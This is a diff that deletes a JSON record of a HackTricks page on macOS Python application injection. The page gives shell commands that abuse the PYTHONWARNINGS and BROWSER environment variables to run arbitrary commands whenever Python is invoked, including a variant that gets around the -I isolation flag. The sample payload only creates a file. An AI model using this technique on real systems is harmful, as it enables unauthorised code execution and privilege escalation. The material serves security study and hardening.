@@ -1,7 +1,0 @@
-{
-    "url": "https://book.hacktricks.xyz/src/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-python-applications-injection",
-    "title": "macos-python-applications-injection",
-    "category": "src/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse",
-    "source": "HackTricks",
-    "content": "# macOS Python Applications Injection\n\n{{#include ../../../banners/hacktricks-training.md}}\n\n## Via `PYTHONWARNINGS` and `BROWSER` env variables\n\nIt's possible to alter both environment variables to execute arbitrary code whenever python is called, for example:\n\n```bash\n# Generate example python script\necho \"print('hi')\" > /tmp/script.py\n\n# RCE which will generate file /tmp/hacktricks\nPYTHONWARNINGS=\"all:0:antigravity.x:0:0\" BROWSER=\"/bin/sh -c 'touch /tmp/hacktricks' #%s\" python3 /tmp/script.py\n\n# RCE which will generate file /tmp/hacktricks bypassing \"-I\" injecting \"-W\" before the script to execute\nBROWSER=\"/bin/sh -c 'touch /tmp/hacktricks' #%s\" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py\n```\n\n{{#include ../../../banners/hacktricks-training.md}}"
-}
